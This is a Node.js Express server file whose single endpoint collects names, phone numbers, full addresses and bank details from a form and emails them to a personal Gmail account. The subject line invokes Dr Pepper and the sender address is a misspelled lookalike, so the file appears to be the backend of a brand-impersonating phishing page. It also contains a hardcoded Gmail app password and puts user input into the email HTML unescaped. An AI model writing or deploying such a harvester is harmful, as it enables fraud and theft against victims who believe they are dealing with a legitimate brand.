// server.js
const express = require("express");
const nodemailer = require("nodemailer");
const dotenv = require("dotenv");
const cors = require("cors");

dotenv.config(); // Load environment variables from .env file

const app = express();

// Middleware
app.use(
  cors({
    origin: "http://127.0.0.1:5501", // Replace with your frontend URL if needed
  })
);
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.post("/send-email", async (req, res) => {
  const {
    firstName,
    lastName,
    phone,
    email,
    address,
    address2,
    city,
    state,
    zip,
    country,
    bank,
  } = req.body;

  const transporter = nodemailer.createTransport({
    service: "Gmail", // or your email provider
    auth: {
      user: "emilyjonhso@gmail.com", // Use the EMAIL_USER from .env
      pass: "onnc hjfm gezn wpit", // Use the EMAIL_PASS from .env
    },
  });

  const mailOptions = {
    from: "emilyjonhso@gmail.com",
    to: "emilyjohnson5228@gmail.com", // Destination email
    subject: "Dr Pepper - Form Submission",
    html: `
      <h3>Form Submission Details</h3>
      <table border="1" cellpadding="5" cellspacing="0" style="width: 100%; border-collapse: collapse;">
        <tr style="background-color: #f2f2f2;">
          <th style="padding: 8px; text-align: left;">First Name</th>
          <th style="padding: 8px; text-align: left;">Last Name</th>
          <th style="padding: 8px; text-align: left;">Email</th>
          <th style="padding: 8px; text-align: left;">Phone</th>
          <th style="padding: 8px; text-align: left;">Address</th>
          <th style="padding: 8px; text-align: left;">Address2</th>
          <th style="padding: 8px; text-align: left;">City</th>
          <th style="padding: 8px; text-align: left;">State</th>
          <th style="padding: 8px; text-align: left;">Zip</th>
          <th style="padding: 8px; text-align: left;">Country</th>
          <th style="padding: 8px; text-align: left;">Bank</th>
        </tr>
        <tr>
          <td style="padding: 8px;">${firstName}</td>
          <td style="padding: 8px;">${lastName}</td>
          <td style="padding: 8px;">${email}</td>
          <td style="padding: 8px;">${phone}</td>
          <td style="padding: 8px;">${address}</td>
          <td style="padding: 8px;">${address2}</td>
          <td style="padding: 8px;">${city}</td>
          <td style="padding: 8px;">${state}</td>
          <td style="padding: 8px;">${zip}</td>
          <td style="padding: 8px;">${country}</td>
          <td style="padding: 8px;">${bank}</td>
        </tr>
      </table>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send("Email sent successfully");
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).send("Failed to send email");
  }
});

app.listen(3000, () => console.log("Server running on port 3000"));
